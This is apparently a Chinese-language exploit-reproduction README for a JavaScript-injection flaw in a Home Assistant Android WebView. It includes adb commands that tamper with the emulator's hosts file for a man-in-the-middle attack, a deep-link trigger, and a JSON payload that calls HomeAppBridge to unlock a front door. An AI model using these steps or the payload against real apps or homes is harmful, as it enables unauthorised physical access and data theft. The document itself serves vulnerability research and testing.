# EXP: 1.3 Dynamic Script Injection Risk

## 漏洞概述

App 每 30 秒轮询 `https://notify.home-assistant.io/api/alert` 获取告警消息，将返回的 `message` 字段直接拼接到 `loadUrl("javascript:showNotification('" + message + "')")` 执行，未做任何过滤。攻击者可通过 MITM 篡改通知响应，注入恶意 JS 调用 `HomeAppBridge` 执行未授权操作。

## 触发方式

```
homeassistant://webview?url=http://10.0.2.2:8000/exp/1.3
```

## 需要两个服务器

### 1. 攻击服务器 (EXP)
```bash
cd exp/home-assistant/1.3_Dynamic_Script_Injection_Risk
python server.py
```

### 2. 官方通知服务器（模拟 notify.home-assistant.io）
```bash
cd apps/home-assistant/server/1.3_Dynamic_Script_Injection_Risk
node server.js
```

### 3. 配置 hosts 和端口转发
```bash
# 模拟器 hosts 映射
adb -s 127.0.0.1:7555 shell "echo '127.0.0.1 notify.home-assistant.io' >> /etc/hosts"

# 端口转发（模拟器 443 → 本机 8443）
adb -s 127.0.0.1:7555 forward tcp:443 tcp:8443
```

## 文件结构

```
exp/home-assistant/1.3_Dynamic_Script_Injection_Risk/
├── server.py          # 攻击服务器（HTTP :8000）
├── exp/
│   └── 1.3.html       # 恶意页面
├── received/          # 回收的数据（自动生成）
└── readme.md          # 本文件

apps/home-assistant/server/1.3_Dynamic_Script_Injection_Risk/
├── server.js          # 官方通知服务器（HTTPS :8443）
├── certs/             # 自签名证书（自动生成）
└── README.md          # 官方服务器文档
```

## 验证步骤

1. 启动官方通知服务器: `cd server/1.3_... && node server.js`
2. 配置 hosts + 端口转发（见上）
3. 启动攻击服务器: `cd exp/1.3_... && python server.py`
4. 触发 Deeplink:
   ```
   adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/1.3"
   ```
5. 等待 30 秒，观察 `received/` 目录

## 攻击变体

将官方服务器的 `message` 改为恶意 payload：
```json
{"message": "'); window.HomeAppBridge.sendCommand('lock.front_door','unlock'); //"}
```
此 JS 注入将通过 `showNotification('` 的闭合和注释符绕过，执行未授权设备控制。
